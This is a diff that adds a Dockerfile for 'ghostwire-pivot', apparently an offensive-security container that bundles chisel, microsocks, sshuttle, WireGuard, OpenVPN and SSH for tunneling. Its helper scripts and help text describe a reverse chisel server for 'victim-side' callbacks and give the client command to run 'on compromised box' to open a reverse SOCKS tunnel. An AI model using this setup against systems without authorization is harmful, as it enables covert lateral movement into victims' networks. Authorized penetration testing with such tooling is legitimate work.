@@ -1,0 +1,113 @@
+# syntax=docker/dockerfile:1
+ARG GHOSTWIRE_BASE=ghostwire-base:dev
+
+# ---- Stage 0: chisel + microsocks build ----
+FROM golang:1.24-bookworm AS gobuilder
+ENV CGO_ENABLED=0 GOTOOLCHAIN=auto
+ARG TARGETOS TARGETARCH
+ENV GOOS=${TARGETOS} GOARCH=${TARGETARCH}
+RUN go install github.com/jpillora/chisel@v1.11.5
+
+# ---- Stage 1: final pivot image ----
+FROM ${GHOSTWIRE_BASE} AS final
+USER root
+
+LABEL org.opencontainers.image.title="ghostwire-pivot" \
+      org.opencontainers.image.description="SOCKS5 / WireGuard / SSH jumpbox for tunneling" \
+      org.opencontainers.image.source="https://github.com/wnoelll/ghostwire"
+
+ENV GHOST_LABEL=pivot
+
+RUN set -eux; \
+    apt-get update; \
+    apt-get install -y --no-install-recommends \
+      microsocks \
+      sshuttle openvpn wireguard-tools openssh-server \
+      iptables nftables iputils-ping; \
+    rm -rf /var/lib/apt/lists/*; \
+    mkdir -p /run/sshd
+
+# ---- chisel from builder ----
+COPY --from=gobuilder /go/bin/chisel /usr/local/bin/chisel
+
+# ---- pivot helpers ----
+RUN cat > /usr/local/bin/gw-socks5 <<'SH'
+#!/usr/bin/env bash
+# SOCKS5 server on 0.0.0.0:1080 (microsocks). Bind a real iface in production.
+set -euo pipefail
+PORT="${1:-1080}"
+USER_AUTH="${MICROSOCKS_USER:-}"
+PASS_AUTH="${MICROSOCKS_PASS:-}"
+args=(-p "$PORT" -i 0.0.0.0)
+[ -n "$USER_AUTH" ] && [ -n "$PASS_AUTH" ] && args+=(-u "$USER_AUTH" -P "$PASS_AUTH")
+echo "[pivot] microsocks :$PORT (auth=${USER_AUTH:+yes}${USER_AUTH:-no})"
+exec microsocks "${args[@]}"
+SH
+RUN chmod +x /usr/local/bin/gw-socks5
+
+RUN cat > /usr/local/bin/gw-chisel-server <<'SH'
+#!/usr/bin/env bash
+# Reverse chisel server for victim-side SOCKS5 callback.
+# Client side: chisel client <server>:<port> R:1080:socks
+set -euo pipefail
+PORT="${1:-8080}"
+KEY="${CHISEL_KEY:-}"
+args=(server -p "$PORT" --reverse)
+[ -n "$KEY" ] && args+=(--key "$KEY")
+echo "[pivot] chisel server :$PORT (reverse mode)"
+exec chisel "${args[@]}"
+SH
+RUN chmod +x /usr/local/bin/gw-chisel-server
+
+RUN cat > /usr/local/bin/gw-wg-up <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+CFG="${1:-/work/wg0.conf}"
+[ -f "$CFG" ] || { echo "config not found: $CFG" >&2; exit 2; }
+sudo wg-quick up "$CFG"
+SH
+RUN chmod +x /usr/local/bin/gw-wg-up
+
+RUN cat > /usr/local/bin/gw-pivot-help <<'SH'
+#!/usr/bin/env bash
+cat <<HELP
+[pivot] common patterns:
+
+SOCKS5 server (this box):
+  gw-socks5 [port]                # microsocks on 0.0.0.0:1080
+
+Reverse SOCKS via chisel:
+  gw-chisel-server 8080            # this side (listens on :8080)
+  # On compromised box:
+  chisel client this-host:8080 R:1080:socks
+
+WireGuard:
+  gw-wg-up /work/wg0.conf
+
+OpenVPN:
+  sudo openvpn /work/client.ovpn
+
+SSH dynamic forward (turn this box into your SOCKS5):
+  ssh -D 0.0.0.0:1080 -N user@jumpbox
+
+SSH tunnel-only (sshuttle):
+  sshuttle -r user@jumpbox 10.0.0.0/8 0/0
+HELP
+SH
+RUN chmod +x /usr/local/bin/gw-pivot-help
+
+COPY scripts/ghostwire-pivot.profile.sh /etc/profile.d/ghostwire-pivot.sh
+RUN echo '. /etc/profile.d/ghostwire-pivot.sh' >> /home/ghost/.bashrc
+
+RUN printf 'ghost ALL=(ALL) NOPASSWD: /usr/bin/wg-quick, /usr/sbin/openvpn, /sbin/ip, /sbin/iptables, /sbin/nft\n' > /etc/sudoers.d/ghost && \
+    chmod 0440 /etc/sudoers.d/ghost
+
+USER ghost
+WORKDIR /work
+EXPOSE 1080 8080
+
+HEALTHCHECK --interval=2m --timeout=5s --start-period=10s --retries=3 \
+  CMD sh -c 'command -v microsocks >/dev/null 2>&1 && command -v chisel >/dev/null 2>&1 && command -v wg >/dev/null 2>&1 || exit 1'
+
+ENTRYPOINT ["/usr/bin/tini","--"]
+CMD ["/bin/bash"]
